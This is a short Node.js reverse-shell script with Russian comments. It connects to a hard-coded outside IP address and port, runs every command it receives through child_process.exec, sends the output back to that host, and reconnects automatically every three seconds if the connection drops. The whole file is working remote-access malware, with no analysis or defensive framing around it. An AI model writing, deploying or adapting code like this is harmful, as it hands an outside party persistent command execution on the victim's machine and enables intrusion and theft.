const net = require('net');
const readline = require('readline');
const { exec } = require('child_process');
const { spawn } = require("node:child_process")

const SERVER_IP = '179.198.220.53';
const SERVER_PORT = 11188;
const RECONNECT_DELAY = 3000; // пауза перед переподключением (3 сек)

function startAgent() {
  const client = new net.Socket();

  client.connect(SERVER_PORT, SERVER_IP, () => {
    client.write('[+] hi loool...\n> ');
  });

  const rl = readline.createInterface({ input: client });

  rl.on('line', (line) => {
    const command = line.trim();

    if (!command) {
      client.write('> ');
      return;
    }

    if (command === 'exit') {
      client.write('closing...\n');
      client.destroy();
      return;
    }

    exec(command, (error, stdout, stderr) => {
      const output = stdout || stderr || (error ? error.message : 'done');
      client.write(`${output}\n> `);
    });
  });

  client.on('close', () => {
    console.log(`[-] closed, reconnecting in ${RECONNECT_DELAY / 1000}с...`);
    rl.close();
    setTimeout(startAgent, RECONNECT_DELAY);
  });

  client.on('error', (err) => {
    console.log(`[!] err: ${err.message}`);
  });
}

startAgent();
